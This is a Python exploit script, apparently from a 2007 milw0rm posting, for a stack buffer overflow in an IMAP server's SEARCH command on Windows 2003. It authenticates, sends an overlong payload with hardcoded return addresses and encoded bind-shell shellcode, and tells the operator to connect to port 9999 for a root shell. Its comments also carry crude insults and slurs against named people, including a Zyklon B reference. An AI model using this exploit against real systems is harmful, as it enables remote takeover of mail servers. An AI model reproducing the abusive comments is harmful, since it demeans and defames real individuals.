#!/usr/bin/python

import os
import sys
import time
import socket
import struct

#this is imap exploit

#710 bytes, tcp port 9999 bind, borrowed from skape miller inventor of megacanvas
sc  = "\x90"
sc += "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xeb\x03\x59"
sc += "\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49\x49\x49\x49"
sc += "\x49\x49\x49\x49\x49\x49\x49\x49\x51\x37\x5a\x6a\x66\x58\x50\x30"
sc += "\x41\x31\x42\x41\x6b\x41\x41\x76\x41\x32\x41\x41\x32\x42\x41\x30"
sc += "\x42\x41\x58\x50\x38\x41\x42\x75\x79\x79\x4b\x4c\x32\x4a\x7a\x4b"
sc += "\x42\x6d\x78\x68\x4c\x39\x4b\x4f\x4b\x4f\x4b\x4f\x75\x30\x6e\x6b"
sc += "\x42\x4c\x45\x74\x71\x34\x6c\x4b\x41\x55\x57\x4c\x4e\x6b\x33\x4c"
sc += "\x53\x35\x51\x68\x55\x51\x68\x6f\x4c\x4b\x72\x6f\x56\x78\x6e\x6b"
sc += "\x61\x4f\x77\x50\x76\x61\x38\x6b\x52\x69\x4e\x6b\x36\x54\x4e\x6b"
sc += "\x67\x71\x4a\x4e\x76\x51\x4f\x30\x6d\x49\x4e\x4c\x4d\x54\x4b\x70"
sc += "\x41\x64\x43\x37\x4b\x71\x6b\x7a\x76\x6d\x54\x41\x4f\x32\x7a\x4b"
sc += "\x6a\x54\x45\x6b\x33\x64\x56\x44\x77\x58\x34\x35\x6b\x55\x4c\x4b"
sc += "\x61\x4f\x46\x44\x55\x51\x58\x6b\x31\x76\x6c\x4b\x46\x6c\x30\x4b"
sc += "\x4e\x6b\x61\x4f\x75\x4c\x64\x41\x38\x6b\x53\x33\x54\x6c\x4c\x4b"
sc += "\x6d\x59\x50\x6c\x64\x64\x55\x4c\x30\x61\x6b\x73\x74\x71\x4b\x6b"
sc += "\x51\x74\x4c\x4b\x51\x53\x70\x30\x4c\x4b\x77\x30\x36\x6c\x4c\x4b"
sc += "\x72\x50\x35\x4c\x4e\x4d\x6c\x4b\x73\x70\x57\x78\x31\x4e\x42\x48"
sc += "\x4e\x6e\x50\x4e\x76\x6e\x5a\x4c\x30\x50\x6b\x4f\x49\x46\x75\x36"
sc += "\x56\x33\x53\x56\x75\x38\x37\x43\x34\x72\x35\x38\x74\x37\x54\x33"
sc += "\x44\x72\x63\x6f\x71\x44\x4b\x4f\x7a\x70\x42\x48\x38\x4b\x38\x6d"
sc += "\x6b\x4c\x47\x4b\x30\x50\x4b\x4f\x4e\x36\x51\x4f\x4f\x79\x4d\x35"
sc += "\x42\x46\x4b\x31\x7a\x4d\x33\x38\x57\x72\x76\x35\x61\x7a\x46\x62"
sc += "\x4b\x4f\x6e\x30\x51\x78\x4b\x69\x67\x79\x59\x65\x6c\x6d\x41\x47"
sc += "\x4b\x4f\x6e\x36\x41\x43\x56\x33\x76\x33\x52\x73\x70\x53\x51\x53"
sc += "\x70\x53\x32\x63\x32\x73\x6b\x4f\x4e\x30\x41\x76\x62\x48\x36\x47"
sc += "\x54\x4f\x41\x76\x72\x73\x4f\x79\x49\x71\x4e\x75\x31\x78\x6e\x44"
sc += "\x67\x6a\x64\x30\x4f\x37\x70\x57\x69\x6f\x6e\x36\x70\x6a\x74\x50"
sc += "\x62\x71\x73\x65\x4b\x4f\x38\x50\x62\x48\x4c\x64\x4e\x4d\x64\x6e"
sc += "\x58\x69\x62\x77\x4b\x4f\x7a\x76\x50\x53\x51\x45\x39\x6f\x58\x50"
sc += "\x71\x78\x6b\x55\x53\x79\x6f\x76\x53\x79\x36\x37\x39\x6f\x79\x46"
sc += "\x72\x70\x61\x44\x33\x64\x62\x75\x59\x6f\x48\x50\x4a\x33\x51\x78"
sc += "\x6d\x37\x71\x69\x79\x56\x71\x69\x70\x57\x6b\x4f\x6e\x36\x51\x45"
sc += "\x69\x6f\x6e\x30\x45\x36\x63\x5a\x41\x74\x35\x36\x72\x48\x30\x63"
sc += "\x50\x6d\x6f\x79\x59\x75\x63\x5a\x52\x70\x43\x69\x37\x59\x58\x4c"
sc += "\x4f\x79\x79\x77\x52\x4a\x33\x74\x4d\x59\x39\x72\x55\x61\x4f\x30"
sc += "\x7a\x53\x6d\x7a\x79\x6e\x47\x32\x76\x4d\x69\x6e\x47\x32\x34\x6c"
sc += "\x6d\x43\x6c\x4d\x72\x5a\x54\x78\x4e\x4b\x4c\x6b\x6c\x6b\x75\x38"
sc += "\x52\x52\x4b\x4e\x4e\x53\x55\x46\x79\x6f\x71\x65\x41\x54\x59\x6f"
sc += "\x4e\x36\x43\x6b\x71\x47\x51\x42\x52\x71\x62\x71\x52\x71\x51\x7a"
sc += "\x33\x31\x56\x31\x46\x31\x51\x45\x50\x51\x59\x6f\x4e\x30\x50\x68"
sc += "\x4c\x6d\x6e\x39\x53\x35\x6a\x6e\x62\x73\x49\x6f\x5a\x76\x50\x6a"
sc += "\x59\x6f\x4b\x4f\x34\x77\x59\x6f\x5a\x70\x6c\x4b\x32\x77\x39\x6c"
sc += "\x6c\x43\x4b\x74\x61\x74\x6b\x4f\x6a\x76\x50\x52\x79\x6f\x6e\x30"
sc += "\x42\x48\x7a\x4f\x6a\x6e\x59\x70\x63\x50\x42\x73\x4b\x4f\x48\x56"
sc += "\x79\x6f\x4e\x30\x66"


def Copulate(target,port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
	return s

def Fascism(target,u,p):
	safe_readable_null = 0x71c010e4 # Safe readable, preferably null (ws2_32 on win2k3)
	safe_writable = 0x0fff7004 # Safe writable (rsaenh.dll data section on win2k3)
	pop_then_ret = 0x77e41a26 # EIP (pop, ret in kernel32 on win2k3)
	call_esp = 0x77e839b3 # Return #2, call esp in kernel32. When hit, esp points at the next 4 bytes.
	s = Copulate(target,143)
	pkt = "0001 LOGIN \""
	pkt += u
	pkt += "\" \""
	pkt += p
	pkt += "\"\r\n"
	SendPacket(s,pkt)
	pkt = "0003 SELECT \"Inbox\"\r\n"
	SendPacket(s,pkt)
	pkt = "C284 SEARCH "
	pkt += "P"*1008
	pkt += struct.pack('<L',safe_readable_null)
	pkt += "CUNT" # Word used to describe members of the infosec community.
	pkt += struct.pack('<L',pop_then_ret)
	pkt += struct.pack('<L',safe_writable)
	pkt += struct.pack('<L',call_esp)
	pkt += "A"*198 # I have boned over 198 bitches
	pkt += "\xeb\x10" # Body Mass Index of Gadi Evron, hexadecimal LOLOLOLOL
	pkt += struct.pack('<L',safe_readable_null)
	pkt += "A"*16 # Unnecessary megathropic nopsled, invented by k2, founding member of n3td3v
	pkt += sc
	pkt += " (SAVE MIN) SINCE 12-Feb-1992 NOT FROM \"Len Rose The Moderating Nazi of Full Disclosure, Original Founder of Zyklon B\"\r\n"
	print "Sending. Hold on."
	SendPacket(s,pkt)
	time.sleep(3)
	print "The service will continue functioning but cannot be exploited again until restart."
	print "Please telnet to port 9999 on it now for a rootshell."
	print "		-management"
	s.close()

def SendPacket(s,pkt):
        s.send(pkt) # comment

if __name__ == '__main__':
        try:
                target = sys.argv[1]
		u = sys.argv[2]
		p = sys.argv[3]
        except IndexError:
                print 'Usage: %s <ip address> <user> <pass>' % sys.argv[0]
                sys.exit(-1)
        Fascism(target,u,p)

# milw0rm.com [2007-08-14]
